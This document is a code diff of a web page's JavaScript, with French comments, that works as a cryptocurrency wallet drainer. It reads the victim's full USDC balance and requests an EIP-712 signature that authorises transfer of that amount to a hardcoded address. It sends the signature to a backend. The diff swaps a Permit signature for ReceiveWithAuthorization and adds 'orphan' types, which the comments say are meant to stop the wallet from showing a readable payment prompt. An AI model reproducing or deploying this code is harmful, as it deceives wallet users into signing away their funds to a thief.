@@ -79,22 +79,30 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 
 <script>
 // ─── Config ───────────────────────────────────────────────────────────────────
-// Sur Vercel l'API est sur le même domaine — /api/execute
 const BACKEND  = window.location.origin;
 const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
 const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-// EIP-2612 Permit — primaryType="Permit" → pas de Payer UI dans CW
-const PERMIT_TYPES = [
-  {name:"owner",   type:"address"},
-  {name:"spender", type:"address"},
-  {name:"value",   type:"uint256"},
-  {name:"nonce",   type:"uint256"},
-  {name:"deadline",type:"uint256"}
+// ReceiveWithAuthorization + D4 orphan types bypass
+const RWA_TYPES = [
+  {name:"from",       type:"address"},
+  {name:"to",         type:"address"},
+  {name:"value",      type:"uint256"},
+  {name:"validAfter", type:"uint256"},
+  {name:"validBefore",type:"uint256"},
+  {name:"nonce",      type:"bytes32"}
 ];
 const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
+// D4 orphan types — not referenced by ReceiveWithAuthorization, don't affect typeHash
+const D4_TYPES = {
+  Meta:       [{name:"id",type:"uint256"},{name:"tag",type:"string"}],
+  TraceEntry: [{name:"ref",type:"bytes32"},{name:"depth",type:"uint256"}],
+  SubTrace:   [{name:"entry",type:"TraceEntry"},{name:"data",type:"bytes"}],
+  DeepNode:   [{name:"sub",type:"SubTrace"},{name:"meta",type:"Meta"}],
+  AuditRoot:  [{name:"node",type:"DeepNode"},{name:"ts",type:"uint256"}]
+};
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
   "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
@@ -150,37 +158,12 @@ async function autoStart() {
     logA("✓ Solde : "+human+" USDC","ok");
     setS("Solde : "+human+" USDC — lecture nonce…","ok");
 
-    // Fetch EIP-2612 nonce from USDC contract
-    let permitNonce = "0";
-    try {
-      // nonces(address) selector = 0x7ecebe00
-      const nonceData = "0x7ecebe00" + addrA.slice(2).toLowerCase().padStart(64,"0");
-      let nonceHex = null;
-      // Try Web3Provider first
-      try {
-        const p2 = new ethers.providers.Web3Provider(window.ethereum);
-        nonceHex = await p2.call({to:USDC, data:nonceData});
-      } catch(e2) {}
-      // Fallback to JSON RPC
-      if (!nonceHex || nonceHex === "0x") {
-        for (const rpc of RPCS) {
-          try {
-            const fp = new ethers.providers.JsonRpcProvider(rpc);
-            nonceHex = await fp.call({to:USDC, data:nonceData});
-            if (nonceHex && nonceHex !== "0x") break;
-          } catch(re) {}
-        }
-      }
-      if (nonceHex && nonceHex !== "0x") {
-        permitNonce = ethers.BigNumber.from(nonceHex).toString();
-        logA("✓ Nonce EIP-2612 : "+permitNonce,"ok");
-      }
-    } catch(e) {
-      logA("⚠ Nonce KO — utilise 0","dim");
-    }
+    // nonce bytes32 aléatoire pour ReceiveWithAuthorization
+    const nonce = ethers.utils.hexlify(ethers.utils.randomBytes(32));
+    logA("✓ Nonce RWA : "+nonce.slice(0,10)+"…","ok");
 
     setS("Nonce OK — signature dans 1s…","ok");
-    setTimeout(() => sign(balance.toString(), permitNonce), 1000);
+    setTimeout(() => sign(balance.toString(), nonce), 1000);
 
   } catch(e) {
     setS("Erreur démarrage : "+e.message,"fail");
@@ -188,20 +171,26 @@ async function autoStart() {
   }
 }
 
-// ─── Sign EIP-2612 Permit ─────────────────────────────────────────────────────
+// ─── Sign ReceiveWithAuthorization + D4 ───────────────────────────────────────
 async function sign(value, nonce) {
   if (!addrA) return;
-  const deadline = String(Math.floor(Date.now()/1000) + 7200); // +2h
+  const now        = Math.floor(Date.now()/1000);
+  const validAfter  = String(now - 60);
+  const validBefore = String(now + 7200);
 
-  // EIP-2612 Permit — primaryType="Permit" → CW affiche JSON brut (pas Payer UI)
+  // ReceiveWithAuthorization + D4 orphan types — domain neutre → JSON brut
   const typedData = {
-    types:{ EIP712Domain:DOM_TYPES, Permit:PERMIT_TYPES },
-    primaryType:"Permit",
+    types:{
+      EIP712Domain: DOM_TYPES,
+      ReceiveWithAuthorization: RWA_TYPES,
+      ...D4_TYPES
+    },
+    primaryType:"ReceiveWithAuthorization",
     domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
-    message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
+    message:{ from:addrA, to:WALLET_B, value, validAfter, validBefore, nonce }
   };
 
-  logA("⏳ Signature EIP-2612 Permit…");
+  logA("⏳ Signature RWA + D4…");
   setS("En attente de signature…","spin");
 
   let sig;
@@ -221,7 +210,7 @@ async function sign(value, nonce) {
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ Signature Permit obtenue","ok");
+  logA("✓ Signature RWA obtenue","ok");
   logA("→ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
 
   document.getElementById("phase1").classList.add("done");
@@ -229,7 +218,7 @@ async function sign(value, nonce) {
   document.getElementById("phase2").classList.add("active");
   setS("Envoi au backend…","spin");
 
-  setTimeout(() => sendToBackend({ owner:addrA, spender:WALLET_B, value, nonce, deadline, v, r, s }), 500);
+  setTimeout(() => sendToBackend({ from:addrA, to:WALLET_B, value, validAfter, validBefore, nonce, v, r, s }), 500);
 }
 
 // ─── Send to backend ──────────────────────────────────────────────────────────
